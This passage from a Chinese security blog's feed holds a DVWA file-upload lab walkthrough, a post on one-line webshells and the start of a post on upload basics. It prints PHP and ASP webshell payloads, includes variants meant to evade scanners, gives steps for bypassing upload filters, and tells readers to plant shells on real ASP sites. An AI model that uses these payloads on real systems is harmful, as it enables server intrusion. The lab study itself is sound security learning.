命令来进行插件的安装。</p><p>4、然后创建一文章 hexo new “test” 然后查看博客的 ../source/_posts 目录下的文件，会看到存在一个test 文件夹 和 test.md 文件</p><p>5、将所需要的图片资源放到test 文件夹</p><p>6、例：图片名为1.jpg，则文章中插入图片这样写：<code>![...](test/1.jpg)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Hexo写博客的一点记录&quot;&gt;&lt;a href=&quot;#Hexo写博客的一点记录&quot; class=&quot;headerlink&quot; title=&quot;Hexo写博客的一点记录&quot;&gt;&lt;/a&gt;Hexo写博客的一点记录&lt;/h1&gt;&lt;p&gt;1.用Typora编写博客&lt;/p&gt;
&lt;p&gt;2.存到 \ so
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>DVWA File Upload</title>
    <link href="http://yoursite.com/2020/05/14/DVWA%20File%20Upload/"/>
    <id>http://yoursite.com/2020/05/14/DVWA%20File%20Upload/</id>
    <published>2020-05-14T12:39:06.226Z</published>
    <updated>2020-05-14T13:59:38.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA-File-Upload"><a href="#DVWA-File-Upload" class="headerlink" title="DVWA File Upload"></a>DVWA File Upload</h1><p>File Upload，即文件上传。文件上传漏洞通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的。</p><p>这是文件上传漏洞很全的一个总结 参考链接：<a href="https://www.cnblogs.com/0daybug/p/12311087.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/12311087.html</a></p><p>webshell概念：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限，也叫webadmin。webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p><p><a href="https://www.jianshu.com/p/02aac12e459f" target="_blank" rel="noopener">参考博客</a></p><p>常规的文件上传操作：<br>客户端上传：</p><pre><code>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;文件上传操作&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br /&gt;    头像：&lt;input type=&quot;file&quot; name=&quot;img&quot;&gt;&lt;br /&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在HTML <form>标签中enctype属性规定在发送到服务器之前应该如何对表单数据进行编码。</form></p><p>它的值有三种：</p><pre><code>application/x-www-form-urlencoded: 在发送前编码所有字符（默认）multipart/form-data: 不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。text/plain: 空格转换为 &quot;+&quot; 加号，但不对特殊字符编码。</code></pre><p>服务端接收：</p><p>使用$_FILES数组接收参数。</p><p>我们打印$_FILES</p><pre><code>print_r($_FILES);</code></pre><p>发现上传一个文件时的属性有：</p><pre><code>[name] =&gt; feng.jpeg     文件的名称[type] =&gt; image/jpeg     文件的MIME类型[tmp_name] =&gt; C:\Users\Administrator\AppData\Local\Temp\php2007.tmp  文件的临时位置[error] =&gt; 0       文件的错误信息  0 ok      1234 error[size] =&gt; 2859    文件的大小</code></pre><p>文件上传漏洞的利用的条件：<br>1.能够成功上传木马文件<br>2.上传文件必须能够被执行<br>3.上传文件的路径必须可知</p><p><a href="https://www.cnblogs.com/yyxianren/p/11381655.html" target="_blank" rel="noopener">参考博客</a></p><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>源码：</strong></p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to? //isset() 函数用于检测变量是否已设置并且非 NULL。    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); //这段代码是有关文件上传之后的位置的。basename(path,suffix)：path必需。规定要检查的路径。在Windows中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）。suffix:可选。规定文件扩展名。如果文件有suffix，则不会输出这个扩展名。    // Can we move the file to the upload folder? 能否可以上传？    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // 判断是否可以上传。move_uploaded_file(file,newloc)：file必需，规定要移动的文件。newloc必需，规定文件的新位置。//move_uploaded_file函数将上传的文件移动到新位置。        // No 即失败        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;     }     else {         // Yes! 即成功        echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;         //返回文件路径    } } ?&gt; </code></pre><p> move_uploaded_file 函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</p><p>如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。<br>如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。</p><p><strong>实战：</strong></p><p>1.这段代码对于上传文件的类型、内容等没有进行任何的过滤检查，直接将文件存储在 “hackable/uploads/“ 路径下。因此我们可以直接上传一个一句话木马文件进行攻击。<br><?php @eval($_POST['1']);?> （php一句话木马）</p><p>上传后出现：../../hackable/uploads/1.php succesfully uploaded!</p><p>浏览器访问（即输入url：127.0.0.1/DVWA-master/hackable/uploads/1.php）确定是否上传成功</p><p>上传成功即可进行下一步。</p><p>2.<a href="https://www.freesion.com/article/6380373568/#22_DVWAhackphp_28" target="_blank" rel="noopener">参考博客</a></p><p>打开中国蚁剑，右键添加数据：URL地址填127.0.0.1/DVWA-master/hackable/uploads/1.php；连接密码写1（因为第一步写的一句话木马post提交的是1）；编码器选chr；点击添加。右键文件管理能看到列表即连接成功。</p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>源码：</strong></p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information 文件信息（上传的文件）    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];     $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     // Is it an image? 判断上传的文件是不是图片（是jpeg和png图片且大小小于100000字节）    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) ) {         // Can we move the file to the upload folder?我们能否上传文件？         if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) {             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         }         else {             // Yes!             echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;             //还是一样会显示路径        }     }     else { //下边是：如果上传的文件不是图片返回的信息        // Invalid file         echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     } } ?&gt; </code></pre><p>多了需要上传图片的条件</p><p><strong>实战：</strong>同样写<?php @eval($_POST['1']);?>,存成2.jpg，上传，用burpsuite拦截把jpg再改成php,打开蚁剑发现文件目录出现了2.jpg跟2.php。<a href="https://www.cnblogs.com/hyq0616-love/p/12661187.html" target="_blank" rel="noopener">参考博客</a></p><h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p>源码：</p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information 文件信息    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); //这句的意思是将文件的后缀名赋给$uploaded_ext。    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; //strrpos函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）；substr函数返回字符串的一部分。//strrpos(string,find,start):string必需。规定被搜索的字符串。find必需。规定要查找的字符.start可选。规定在何处开始搜索。    // Is it an image? 判断图片    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) { //strtolower函数将所有字符转换为小写；getimagesize函数用于获取图像的大小及相关信息。        // Can we move the file to the upload folder? 同上        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         }         else {             // Yes!             echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;         }     }     else {         // Invalid file         echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     } } ?&gt; </code></pre><p><strong>实战：</strong></p><p>不是对类型做限制，而是对后缀做了白名单限制。并且对图像内容做了检测。上传图片码解决</p><p>1.制作图片马,命令行终端执行。（将代码和图片合为一体）</p><pre><code>copy 1.jpg/b+3.php/a hack.jpg</code></pre><p>2.或者直接bp抓包，修改内容，加上图片头GIF89a</p><ol><li><p>上传1.jpg的木马文件，抓包</p></li><li><p>加上GIF89a的图片头，让其误以为内容是图片</p><p><img src="https://img2020.cnblogs.com/blog/1962254/202005/1962254-20200503155942090-75242379.png" alt="img"></p><p><a href="https://www.cnblogs.com/kbhome/p/12822233.html" target="_blank" rel="noopener">参考博客</a></p></li></ol><h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p>源码：</p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Check Anti-CSRF token 意为校验token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );     // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); //返回上传的文件名.后面的字符，即文件类型    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];     // Where are we going to be writing to?     $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;;     //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;     $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;     $temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );     $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; //这边是重写文件名（在文件名前面加id再整体md5）//将上传的文件进行改名以及确定上传的目录位置。uniqid函数基于以微秒计的当前时间，生成一个唯一的 ID；ini_get函数用于获取一个配置选项的值或者说获取php.ini里的环境变量的值 。sys_get_temp_dir函数用于返回用于临时文件的目录。    // Is it an image? 仍旧限制了条件    if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) {         // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 下边是将上传的图片重新编码        if( $uploaded_type == &#39;image/jpeg&#39; ) {             $img = imagecreatefromjpeg( $uploaded_tmp );             imagejpeg( $img, $temp_file, 100); //imagejpeg ( image , filename , quality)//从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。        }         else {             $img = imagecreatefrompng( $uploaded_tmp );             imagepng( $img, $temp_file, 9);         }         imagedestroy( $img );//imagedestroy函数销毁图像资源 //imagecreatefromjpeg ( filename )函数返回图片文件的图像标识，失败返回false        // Can we move the file to the web root from the temp folder? 意为是否可以将文件从临时目录转移到web根目录。//rename函数重命名文件或目录；getcwd函数用于获取当前的工作目录；        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {             // Yes!             echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;         }         else {             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         }         // Delete any temp files 意为删除所有临时文件。        if( file_exists( $temp_file ) )//file_exists函数用于检查文件或目录是否存在。             unlink( $temp_file ); //unlink函数用于删除文件。    }     else {         // Invalid file 上传的文件不符合规则        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     } } // Generate Anti-CSRF token generateSessionToken(); //生成token?&gt; </code></pre><p>函数学习：</p><p>substr(string,start,length)<br>函数返回字符串的一部分</p><p>strrpos(string,find,start)<br>函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p><p>uniqid(prefix,more_entropy)：prefix可选，为 ID 规定前缀。如果两个脚本恰好在相同的微秒生成 ID，该参数很有用；more_entropy可选，规定位于返回值末尾的更多的熵。</p><p>ini_get( string $varname )：varname必需，配置选项名称。</p><p>ini_get拓展概念：成功是返回配置选项值的字符串，null 的值则返回空字符串。如果配置选项不存在，将会返回 FALSE。<br>注意: 当查询一个 boolean 值 ，一个 off 的 boolean ini 值将会以空字符串或者 “0” 返回；on 的 ini 值会以 “1” 返回。 此函数也会返回 INI 值的文字字符串。<br>注意: 当查询一个内存尺寸的值，许多内存尺寸的 ini 值，类似 upload_max_filesize 是以简写表示法储存在 php.ini 文件里。 ini_get() 会返回 php.ini 文件中储存的确切字符串，而不是它的等量 integer。尝试对这些值使用常规算术运算函数将不会得到预期的结果。 以上例子显示了转换简写表示法为字节的一种方式，和 PHP 源码所做的比较像。<br>注意: ini_get() 无法读取 “array” 的 ini 选项，例如 pdo.dsn.*，在这个例子中会返回 FALSE 。 </p><p>getimagesize()<br>函数用来获取图像的大小和类型<br>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><p>扩展：</p><p>源码中使用了一个非常不安全的的函数：<strong>getimagesize()</strong></p><p>getimagesize()函数会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。</p><p>getimagesize()返回结果中有文件大小和文件类型，如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。因为图片头可以被伪造，我们完全可以通过伪造正确的图片头来绕过它对图片类型的检查。</p><p>这就是图片的十六进制，前几位都是一样的</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200424143107947-1812469690.png" alt="img"></p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200424143459251-1601347052.png" alt="img"></p><p>按照这样的逻辑，我们就可以去伪造一个假图片，让函数以为我们这就是图片，达到绕过的目的。</p><ul><li>方法1 直接伪造头部GIF89A</li><li>方法2 CMD：copy /b test.png+munma.php hack.png</li><li>方法3 使用GIMP（开源的图片修改软件），通过增加备注，写入执行命令。</li></ul><p>但是，即使我们可以根据上述方法绕过函数getimagesize()，我们也绕不过imagecreatefromjpeg ( filename )、imagejpeg ( image , filename , quality)、imagedestroy( img )等几个函数对我们上传图片的重塑。所以，Impossible等级的代码是比较安全的。<a href="https://blog.csdn.net/weixin_43915842/article/details/90183305" target="_blank" rel="noopener">参考博客1</a>   <a href="https://www.cnblogs.com/zhengna/p/12764718.html" target="_blank" rel="noopener">参考博客2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA-File-Upload&quot;&gt;&lt;a href=&quot;#DVWA-File-Upload&quot; class=&quot;headerlink&quot; title=&quot;DVWA File Upload&quot;&gt;&lt;/a&gt;DVWA File Upload&lt;/h1&gt;&lt;p&gt;File Upload，即文
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>一句话木马的原理及利用</title>
    <link href="http://yoursite.com/2020/05/14/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/05/14/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</id>
    <published>2020-05-14T12:38:58.625Z</published>
    <updated>2020-05-13T07:19:39.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一句话木马的原理及利用"><a href="#一句话木马的原理及利用" class="headerlink" title="一句话木马的原理及利用"></a>一句话木马的原理及利用</h1><h3 id="一句话木马的举例说明："><a href="#一句话木马的举例说明：" class="headerlink" title="一句话木马的举例说明："></a>一句话木马的举例说明：</h3><p>黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：<br>&lt;%execute request(“value”)%&gt;<br>其中value是值，所以你可以更改自己的值，前面的request就是获取这个值<br>&lt;%eval request(“value”)%&gt;(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)<br>当知道了数据库的URL，就可以利用本地一张网页进行连接得到Webshell。（不知道数据库也可以，只要知道&lt;%eval request(“value”)%&gt;这个文件被插入到哪一个ASP文件里面就可以了。）<br>这就被称为一句话木马，它是基于B/S结构的。</p><h3 id="一句话木马的工作原理："><a href="#一句话木马的工作原理：" class="headerlink" title="一句话木马的工作原理："></a>一句话木马的工作原理：</h3><p>“一句话木马”服务端（本地的html提交文件）<br>就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为   &lt;%execute request(“value”)%&gt;   其中value可以自己修改</p><p>“一句话木马”客户端（远程服务器上被插入一句话的asp文件）<br>用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件</p><p>现在先假设在远程主机的TEXT.ASP(客户端）中已经有了&lt;%execute request(“value”)%&gt;这个语句.)在ASP里&lt;%execute …………”)%&gt;意思是执行省略号里的语句.那么如果我写进我们精心构造的语句,它也是会帮我们执行的.就按照这上面的思路,我们就可以在本地构造一个表单内容如下:(//为注释)</p><pre><code>&lt;form action=http://主机路径/TEXT.asp method=post&gt;&lt;textarea name=value cols=120 rows=10 width=45&gt;set lP=server.createObject(&quot;Adodb.Stream&quot;)//建立流对象lP.Open //打开lP.Type=2 //以文本方式lP.CharSet=&quot;gb2312&quot; //字体标准lP.writetext request(&quot;newvalue&quot;)lP.SaveToFile server.mappath(&quot;newmm.asp&quot;),2 //将木马内容以覆盖文件的方式写入newmm.asp，2就是已覆 盖的方式lP.Close //关闭对象set lP=nothing //释放对象response.redirect &quot;newmm.asp&quot; //转向newmm.asp&lt;/textarea&gt;&lt;textarea name=newvalue cols=120 rows=10 width=45&gt;添入生成木马的内容&lt;/textarea&gt;&lt;BR&gt;&lt;center&gt;&lt;br&gt;&lt;input type=submit value=提交&gt;&lt;/form&gt;</code></pre><p>表单的作用就是把我们表单里的内容提交到远程主机的TEXT.ASP这个文件.然后因为TEXT.ASP里有&lt;%execute request(“value”)%&gt;这句,那么这句代码就会执行我们从表单里传来的内容哦.(表单名必须和&lt;%execute request(“value”)%&gt;里的VALUE一样,就是我用蓝色标记的那两处,必须相等)</p><p>说到这里大家是不是清楚了.我们构造了两个表单,第一个表单里的代码是文件操作的代码(就是把第二个表单内的内容写入在当前目录下并命名为newvalue.ASP的这么一段操作的处理代码)那么第二个表单当然就是我们要写入的马了.</p><p>具体的就是下面这一段:</p><pre><code>set lP=server.createObject(&quot;Adodb.Stream&quot;)//建立流对象lP.Open //打开lP.Type=2 //以文本方式lP.CharSet=&quot;gb2312&quot; //字体标准lP.writetext request(&quot;newvalue&quot;)lP.SaveToFile server.mappath(&quot;newvalue.asp&quot;),2 //将木马内容以覆盖文件的方式写入newmm.asp，2就是已覆 盖的方式lP.Close //关闭对象set lP=nothing //释放对象response.redirect &quot;newmm.asp&quot; //转向newmm.asp</code></pre><p>这样的话第二个表单的名字必须和lP.writetext request(“newvalue”) 里的Newvalue一样,就是我用红色标注的那两处.<br>至此只要服务器有写的权限你表单所提交的大马内容就会被写入到newmm.asp中。即newmm.asp为我们的shell地址。</p><h3 id="常用写法："><a href="#常用写法：" class="headerlink" title="常用写法："></a>常用写法：</h3><p>asp一句话木马：&lt;%execute(request(“value”))%&gt;<br>php一句话木马：<?php @eval($_POST[value]);?><br>aspx一句话木马：<br>　　&lt;%@ Page Language=”Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>其他一句话木马：</p><pre><code>&lt;%eval request(&quot;value&quot;)%&gt;　　&lt;%execute request(&quot;value&quot;)%&gt;　　&lt;%execute(request(&quot;value&quot;))%&gt;　　&lt;%If Request(&quot;value&quot;)&lt;&gt;&quot;&quot; Then Execute(Request(&quot;value&quot;))%&gt;　　&lt;%if request (&quot;value&quot;)&lt;&gt;&quot;&quot;then session(&quot;value&quot;)=request(&quot;value&quot;):end if:if session(&quot;value&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;value&quot;)%&gt;　　&lt;SCRIPT language=VBScript runat=&quot;server&quot;&gt;execute request(&quot;value&quot;)&lt;/SCRIPT&gt;　　&lt;%@ Page Language=&quot;Jscript&quot;%&gt;　　&lt;%eval(Request.Item[&quot;value&quot;],&quot;unsafe&quot;);%&gt; </code></pre><p>可以躲过雷客图的一句话木马：</p><pre><code>　　&lt;%　　set ms = server.CreateObject(&quot;MSScriptControl.ScriptControl.1&quot;)　　ms.Language=&quot;VBScript&quot;　　ms.AddObject &quot;Response&quot;, Response　　ms.AddObject &quot;request&quot;, request　　ms.ExecuteStatement(&quot;ev&quot;&amp;&quot;al(request(&quot;&quot;value&quot;&quot;))&quot;)　　%&gt;</code></pre><p>不用’&lt;,&gt;’的asp一句话木马：</p><p>　　<script language="VBScript" runat="server">execute request("value")</script><br>不用双引号的一句话木马：&lt;%eval request(chr(35))%&gt;<br>UTF-7编码加密:<br>&lt;%@ codepage=65000%&gt;&lt;% response.Charset=”936″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%&gt;</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库，或者加进asp网页.<br>记住!我们的目的是把一句话&lt;%execute request(“value”)%&gt;添加到数据库,无论任何方式!<br>然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者是asp网页,然后进入此网站服务器。</p><h3 id="使用环境："><a href="#使用环境：" class="headerlink" title="使用环境："></a>使用环境：</h3><p>1.服务器的来宾账户有写入权限<br>2.已知数据库地址且数据库格式为asa或asp<br>3.在数据库格式不为asp或asa的情况下，如果能将一句话插入到asp文件中.</p><p><a href="https://www.cnblogs.com/milantgh/p/3629199.html" target="_blank" rel="noopener">参考博客</a></p><p><a href="https://baike.baidu.com/item/一句话木马/1845646?fr=aladdin" target="_blank" rel="noopener">参考网址</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一句话木马的原理及利用&quot;&gt;&lt;a href=&quot;#一句话木马的原理及利用&quot; class=&quot;headerlink&quot; title=&quot;一句话木马的原理及利用&quot;&gt;&lt;/a&gt;一句话木马的原理及利用&lt;/h1&gt;&lt;h3 id=&quot;一句话木马的举例说明：&quot;&gt;&lt;a href=&quot;#一句话木马的
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>文件上传原理</title>
    <link href="http://yoursite.com/2020/05/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/05/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86/</id>
    <published>2020-05-14T12:38:51.321Z</published>
    <updated>2020-05-13T12:47:43.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传原理"><a href="#文件上传原理" class="headerlink" title="文件上传原理"></a>文件上传原理</h1><p>文件上传：因为浏览器本身的限制，浏览器是不能直接操作文件系统的，需要通过浏览器所暴露出来的统一接口，由用户主动授权发起来访问文件动作，然后读取文件内容进指定内存里，最后执行提交请求操作，将内存里的文件内容数据上传到服务端，最后服务端解析前端传来的数据信息后存入文件里。</p><h4 id="PHP文件上传原理：参考博客"><a href="#PHP文件上传原理：参考博客" class="headerlink" title="PHP文件上传原理：参考博客"></a>PHP文件上传原理：<a href="https://www.cnblogs.com/promiseslc/p/8365986.html" target="_blank" rel="noopener">参考博客</a></h4><p>1、文件上传原理</p><p>　　将客户端的文件上传到服务器，再将服务器的临时文件上传到指定目录</p><p>2、客户端配置</p><ul><li>提交表单</li><li>表单的发送方式为post</li><li>添加enctype=”multipart/form-data”</li></ul><p>3、服务器端配置</p><ul><li>file_uploads = On，支持HTTP上传</li><li>uoload_tmp_dir = ，临时文件保存目录</li><li>upload_max_filesize = 2M，允许上传文件的最大值</li><li>max_file_uploads = 20 ，允许一次上传到的最大文件数</li><li>post_max_size = 8M，post方式发送数据的最大值</li><li>max_execution_time = -1，设置了脚本被解析器终止之前允许的最大执行时间，单位为秒，防止程序写的不好而占尽服务器资源。-1代表无穷</li><li>max_input_time = 60 ，脚本解析输入数据允许的最大时间，单位为秒</li><li>max_input_nesting_level = 64 ，设置输入变量的嵌套深度</li><li>max_input_vars_ = 1000，接受多少输入的变量（限制分别应用于$_GET、$_POST和$_COOKIE超全局变量，将会导致E_WARNING的产生，更多的输入变量将会从请求中截断。</li><li>memory_limit = 128M，最大单线程的独立内存使用量。也就是一个web请求，给予线程最大的内存使用量的定义</li></ul><p>4、错误信息说明</p><p>1）UPLOAD_ERR_OK：其值为0，没有错误发生，文件上传成功</p><p>2）UPLOAD_ERR_INI_SIZE：其值为1，上传的文件超过了php.ini中upload_max_filesize选项限制的值</p><p>3）UPLOAD_ERR_FORM_SIZE：其值为2，上传文件的大小超过了HTML表单中MAX_FILE_SIZE选项指定的值</p><p>4）UPLOAD_ERR_PARTIAL：其值为3，文件只有部分被上传</p><p>5）UPLOAD_ERR_NO_FILE：其值为4，没有文件被上传</p><p>6）UPLOAD_ERR_NO_TMP_DIR：其值为6，找不到临时文件夹</p><p>7）UPLOAD_ERR_CANT_WRITE：其值为7，文件写入失败</p><p>8）UPLOAD_ERR_EXTENSION：其值为8，上传的文件被PHP扩展程序中断</p><p>5、客户端限制</p><ul><li><p>通过表单隐藏域限制文件上传文件的最大值</p><pre><code>&lt;input type=&#39;hidden&#39; name=&#39;MAX_FILE_SIZE&#39; VALUE=&#39;字节数&#39; /&gt;</code></pre></li><li><p>通过accept属性限制上传文件类型</p><pre><code>&lt;input type=&#39;file&#39; name=&#39;myFile&#39; accept=&#39;文件的MIME类型&#39; /&gt;</code></pre></li></ul><p>6、在客户端的限制，用户可在网页上修改代码后上传，故无实际意义。应在服务器端加以限制</p><p>1）限制上传文件的大小</p><p>2）限制上传文件类型</p><p>3）检测是否为真实图片类型</p><p>4）检测是否为HTTP POST方式上传</p><h4 id="HTTP文件上传的基本原理："><a href="#HTTP文件上传的基本原理：" class="headerlink" title="HTTP文件上传的基本原理："></a>HTTP文件上传的基本原理：</h4><p>使用html 的<input type="file" name="xxx"> 标签，提交form 的几个属性必须为： method=post  encType=multipart/form-data;<br>method 属性必须设为post的原因是：值不是放在URL之后传递到服务器的；<br>encType属性：这个属性管理的是表单的MIME编码<br>几个属性详解：<br>         application/x-www-form-urlencoded   